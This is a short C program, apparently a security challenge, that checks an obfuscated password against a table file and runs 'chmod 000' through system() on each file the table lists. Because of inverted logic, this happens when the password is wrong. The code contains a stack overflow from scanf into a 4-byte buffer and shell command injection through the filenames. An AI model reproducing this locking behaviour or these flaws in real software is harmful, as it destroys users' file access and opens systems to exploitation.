#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>

void encrypt(char *array, int array_size, char* encrypted){
    srand(123456);
    int secret[16] = { 94,  1130,  1190,   229,   291,   678,  1401,  510, 869,   577,  1085,   226,  1336,  1738,   162,   499};
    for(int i = 0; i < array_size; i++){
        encrypted[i] = ((int) array[i%sizeof(array)] ^ secret[i%16] + rand()) % 32 + 74;
    }
}

void abs_path (char *path, char *dir, char *fname){
    strcpy(path, dir);
    strcat(path, "/");
    strcat(path, fname); 
}

int main(){
    char input[4];
    char filename[256];
    char password[128];
    char encrypted[128];
    printf("Enter password to run this file: ");
    scanf("%s", input);
    FILE* ptr;
    ptr = fopen("template.tbl", "r");

    if (ptr == NULL ) {
        printf("fopen() error\n");
        goto END;
    }
 
    encrypt(input, 64, encrypted);
    fgets(password, sizeof(password), ptr);

    char *dir = (char*) malloc(sizeof(char)*PATH_MAX);
    

    if (getcwd(dir, PATH_MAX) != NULL) {
                
    } else {
        perror("Error getcwd(): ");
        goto END;
    }

    if (strcmp(encrypted, password)){
        while (fgets(filename, sizeof(filename), ptr) != NULL){
            char *cmd = (char*) malloc(sizeof(char)*1024);
            char *path = (char*) malloc(sizeof(char)*PATH_MAX);
            abs_path(path, dir, filename);
            strcpy(cmd, "chmod 000 ");
            strcat(cmd, path);
            system(cmd);
        }
    } else {
        printf("Wrong password!");
    }     
    
END:
    fclose(ptr);
    return 0;
}